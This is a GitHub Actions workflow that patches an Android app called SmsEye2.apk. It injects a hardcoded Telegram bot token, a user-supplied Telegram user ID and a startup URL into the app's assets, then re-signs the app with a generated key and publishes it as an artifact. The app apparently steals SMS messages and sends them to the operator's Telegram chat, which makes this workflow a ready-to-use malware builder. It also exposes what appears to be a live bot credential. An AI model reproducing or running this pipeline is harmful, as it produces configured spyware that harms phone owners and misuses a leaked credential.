name: Inject assets into APK without rebuilding

on:
  workflow_dispatch:
    inputs:
      user_id:
        description: 'Telegram numeric user ID (id.txt)'
        required: true
      app_url:
        description: 'Startup URL (url.txt)'
        required: true

jobs:
  patch-apk:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v3

    - name: Install tools
      run: |
        sudo apt update
        sudo apt install -y default-jdk zipalign unzip

    - name: Unpack APK
      run: |
        mkdir working
        cp SmsEye2.apk original.apk
        unzip -q original.apk -d working

    - name: Inject files into assets/
      run: |
        echo "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4" > working/assets/token.txt
        echo "${{ github.event.inputs.user_id }}" > working/assets/id.txt
        echo "${{ github.event.inputs.app_url }}" > working/assets/url.txt

    - name: Rebuild APK
      run: |
        cd working
        zip -r ../unsigned.apk *
        cd ..

    - name: Align and Sign APK
      run: |
        zipalign -v 4 unsigned.apk aligned.apk

        keytool -genkey -v -keystore keystore.jks -storepass password -alias key0 -keypass password \
          -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=SmsEye"

        jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
          -keystore keystore.jks -storepass password -keypass password aligned.apk key0

        mv aligned.apk SmsEye_Modified.apk

    - name: Upload APK
      uses: actions/upload-artifact@v4
      with:
        name: Final-Patched-APK
        path: SmsEye_Modified.apk
